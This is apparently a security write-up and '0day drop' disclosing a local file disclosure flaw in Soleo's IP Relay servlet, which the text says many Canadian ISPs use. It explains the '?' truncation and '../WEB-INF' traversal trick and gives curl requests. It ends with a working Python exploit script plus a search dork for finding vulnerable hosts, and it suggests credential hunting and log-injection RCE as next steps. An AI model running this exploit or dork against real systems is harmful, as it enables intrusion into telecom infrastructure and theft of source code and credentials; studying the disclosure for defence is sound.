@@ -1,0 +1,321 @@
+		The pwnage of Canadian IP Relay 	
+		     by Dominik Penner		
+			      @Insecurity
+
+
+
+--[ Table of Contents
+
+
+  1 - Introduction
+  2 - Local File Disclosure
+  3 - Proof of Concept
+  4 - Impact
+  5 - Who is affected?
+  6 - Disclosure attempts
+  7 - 0day drop
+
+
+--[ 1 - Introduction
+
+Dominik Penner from Project Insecurity discovered a local file
+disclosure vulnerability in Soleo (Soleo Communications)'s IP
+Relay software. This vulnerability allows an attacker to read
+local system files on the server.
+
+--[ 2 - Local File Disclosure
+
+What we discovered in Soleo's IP Relay was a local file discl-
+osure vulnerability. Upon visiting the login page of a provider's
+IP Relay client, we decided to poke around a bit more. We noticed
+that if you were to click the "forgot password" or "FAQ" link, it
+would bring us to a URL which appeared as the following:
+
+
+	http://<host>/IPRelayApp/servlet/IPRelay?page=forgotPassword
+
+
+The obvious GET parameter was what immediately jumped out at us
+so we started tinkering. If we change the parameter to "test",
+we're shown this error:
+
+	"HTTP STATUS 404 - /IPRelayApp/jsp/test.jsp"
+
+From this error it's clear that the the "page" parameter is for
+loading files. As you can see there's a trailing .jsp extension
+which we didn't include in the URL. This is one of the servlet's
+security mechanisms to avoid loading sensitive files. Null-byte
+poisoning was an unlikely option seeing as we were up against an
+application written in Java; so we turned to HTTP parameter po-
+llution. By including a trailing question mark on the file name,
+we were able to fool the server into thinking it was about to
+recieve a parameter, effectively truncating the terminating .jsp
+that the servlet keeps trying to add. Let's try it.
+
+
+	http://<host>/IPRelayApp/servlet/IPRelay?page=anyfile.txt?
+
+
+Sure enough, the server responds with this:
+
+	"HTTP STATUS 404 - /IPRelayApp/jsp/anyfile.txt"
+
+
+After we had managed to chop off the trailing .jsp, we tried
+loading the good old passwd file (/etc/passwd) to confirm that
+this was indeed a file disclosure vulnerability. The server
+responds to us with this upon attempting that:
+
+	"IPRelay - Interal Error"
+
+After a bit of enumeration, it appears as though IPRelay throws
+us an internal server error because we're trying to load files
+which are located outside of the "IPRelayApp" directory. This
+limits us to loading files within IPRelayApp/*. However, this
+is what the directory structure looks like, thanks to Tomcat:
+
+-----------------
+
+IPRelayApp/
+  |- jsp/
+  |- images/
+  |- html/
+  |- META-INF/
+  |- WEB-INF/
+     |- classes/
+     |- help/
+     |- logs/
+     |- lib/
+     |- xml/
+     |- files/
+     |- web.xml
+
+-----------------
+
+
+As you can tell, WEB-INF is a child directory of IPRelayApp,
+meaning that we can load files from it. WEB-INF is where Tomcat
+stores source files, logs, and other goodies. One of the files
+in WEB-INF is called web.xml. When we load web.xml, the server 
+responds with an XML document which has a few mappings telling
+Tomcat where to pull certain files from. 
+
+$ curl "<redacted>/IPRelayApp/servlet/IPRelay?page=../WEB-INF/web.xml?"
+
+	<web-app>
+		<!-- Filters -->
+		<filter>
+			<filter-name>LoggedInFilter</filter-name>
+			<filter-class>com.soleo.iprelayweb.common.filters.LoggedInFilter</filter-class>
+			<init-param>
+				<param-name>LoginStateAttributeName</param-name>
+				<param-value>com.soleo.iprelay.UserID</param-value>
+			</init-param>
+
+***TRUNCATED***
+
+
+
+--[ 3 - Proof of concept
+
+At this point we wrote a python script which would parse the web.xml
+file and give us a nice little list of source files that we could
+potentially load. This was the output of our script:
+
+$ ./iprelay -t <redacted>
+
+[+] connecting to <redacted>
+src file found @ 'com/soleo/iprelayweb/common/filters/LoggedInFilter.class'
+src file found @ 'com/soleo/iprelayweb/common/filters/RedirectionFilter.class'
+src file found @ 'com/soleo/iprelayweb/common/filters/HostnameFilter.class'
+src file found @ 'com/soleo/iprelayweb/common/filters/SetHeadersFilter.class'
+
+***TRUNCATED***
+
+
+By querying those files from WEB-INF/classes/*, we can download
+java classes from the source code. Obviously, they're in Java
+bytecode format, which means we'll need to revert them back to
+source, however there's a bunch of online resources which allow
+you to do so. 
+
+i.e javadecompilers.com
+
+
+$ cat ChangePasswordServlet.class
+
+public class ChangePasswordServlet
+  extends HttpServlet
+{
+  private static final long serialVersionUID = ****REDACTED****
+  private static final Logger logger = Logger.getLogger("com.soleo.iprelayapp");
+  
+  public ChangePasswordServlet() {}
+  
+  public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException
+  {
+
+***TRUNCATED***
+
+
+Obviously there are files beyond what's defined in the web.xml file.
+
+Many Tomcat applications will host files like "db.properties" or
+"config.properties" within the WEB-INF directory. Had we really
+wanted to blow this out of the water, we could've included
+where the database configuration files are located. However...
+we're not about that life :)
+
+A typical attacker would start looking for configuration files
+with passwords in them so that they could remotely connect to the
+host with file writing permissions, and ultimately spawn a shell
+(backdoor). If this doesn't end up working out, an attacker would
+typically analyze the source code for other vulnerabilities that
+could potentially compromise the server. Either that, or use what's
+in the source as a foothold for some type of social engineering attack.
+
+Another technique (which is by no means new) that an attacker could've
+used to escalate to RCE is log file injection.If a malicious attacker
+were able to identify specific file names of the log files stored in
+WEB-INF/logs, they could inject their own code which would then be
+interpreted by the server when including the log file.
+
+
+--[ 4 - Impact
+
+According to netsparker, Local File Inclusion / Local File Discl-
+osure scores "High" on a scale of
+
+- critical
+- high          <---- we are here
+- medium
+- low
+- information
+
+Considering this vulnerability is widespread across all Canadian
+Internet Service Providers, it is a huge concern. The fact that 
+Canadian elections are upcoming in 2019 is another factor which 
+plays a role in the impact of this vulnerability. If an APT or 
+foreign entity were to leverage this properly against every
+ISP, up to 30 million Canadian records could potentially get
+compromised. This wouldn't be the first time a chain of cyber
+attacks would be used to interfere in geopolitical affairs.
+See Guccifer/2.0.
+
+
+--[ 5 - Who is affected
+
+Essentially every single internet service provider in Canada.
+
+> Bell
+> Telus
+> Rogers
+> Shaw
+> MTS
+> Allstream
+> Sasktel
+> Videotron
+> Eastlink
+> Koodo
+> Fido
+> Bell Aliant
+> Cogeco
+> Chatr
+> others that haven't been listed
+
+Some of these companies don't host their own IP Relay service,
+they use the IP Relay service hosted at iprelayservice.net. 
+However, the majority do host their own service on their
+own subdomain.
+
+
+--[ 6 - Disclosure attempts
+
+July 17th: An email with our findings was sent to the email on SOLEO’s
+website.
+
+July 18th-25th: Several more emails were sent to the same email over
+the course of a week.
+
+August 8th: VP of Service Assurance reaches out via LinkedIn.
+
+August 10th: Vendor confirms patch, refuses to establish disclosure
+timeline despite multiple attempts.
+
+
+--[ 7 - 0day drop
+
+This entire post was a 0day drop, but seeing as we've taken
+precautionary measures to warn the public, and have given time
+to the vendors to patch, we decided we might as well release
+the proof of concept script. Enjoy.
+
+
+#!/usr/bin/env python3
+'''
+
+	TITLE 	:: IPRELAY LOCAL FILE DISCLOSURE 0DAY
+	DATE  	:: 20/09/18 (friday the 13th)
+	DORK	  :: inurl:IPRelayApp
+	AUTHOR 	:: Dominik Penner via. PROJECT INSECURITY
+
+		attention:
+	    this is a friendly neighborhood 0day drop.
+	    sponsored by.....
+
+	             __                              ___   __        .ama     , ™
+	          ,d888a                          ,d88888888888ba.  ,88"I)   d
+	         a88']8i                         a88".8"8)   `"8888:88  " _a8'
+	       .d8P' PP                   .d8P'.8  d)      "8:88:baad8P'
+	      ,d8P' ,ama,   .aa,  .ama.g ,mmm  d8P' 8  .8'        88):888P'
+	     ,d88' d8[ "8..a8"88 ,8I"88[ I88' d88   ]IaI"        d8[         
+	     a88' dP "bm8mP8'(8'.8I  8[      d88'    `"         .88          
+	    ,88I ]8'  .d'.8     88' ,8' I[  ,88P ,ama    ,ama,  d8[  .ama.g
+	    [88' I8, .d' ]8,  ,88B ,d8 aI   (88',88"8)  d8[ "8. 88 ,8I"88[
+	    ]88  `888P'  `8888" "88P"8m"    I88 88[ 8[ dP "bm8m88[.8I  8[
+	    ]88,       _,,aaaaaa,_       I88 8"  8 ]P'  .d' 88 88' ,8' I[
+	    `888a,.  ,aadd88888888888bma.   )88,  ,]I I8, .d' )88a8B ,d8 aI
+	      "888888PP"'        `8""""""8   "888PP'  `888P'  `88P"88P"8m"
+
+	      @zer0pwn @insecurity
+
+	http://<redacted>/servlet/IPRelay?page=../WEB-INF/web.xml?
+
+
+	'''
+
+	import argparse
+	import requests
+	import sys
+	import re
+
+	ap = argparse.ArgumentParser()
+	ap.add_argument("-t", "--target", required=1)
+	args = ap.parse_args()
+
+	def readfile(t, f):
+		payload 	= "../../WEB-INF/{0}?".format(f)
+		payload2 	= "../WEB-INF/{0}?".format(f)
+		target 		= "{0}/IPRelayApp/servlet/IPRelay?page=".format(t)
+		r = requests.get(target + payload)
+		print("[+] connecting to {0}".format(t))
+		if(r.status_code == 200):
+			return r.text
+		else:
+			r = requests.get(target + payload2)
+			if(r.status_code == 200):
+				return r.text
+		return r.status_code
+
+	def parse_classes(f):
+		test = re.findall(r'<(.*)-class>(.*)</(.*)-class>', f)
+		source_files = list()
+		for i in test:
+			source_files.append(i[1].replace(".", "/") + ".class")
+		return source_files
+
+	webxml = readfile(args.target, "web.xml")
+	classnames = parse_classes(webxml)
+
+	for i in classnames:
+		print("src file found @ '{0}'".format(i))
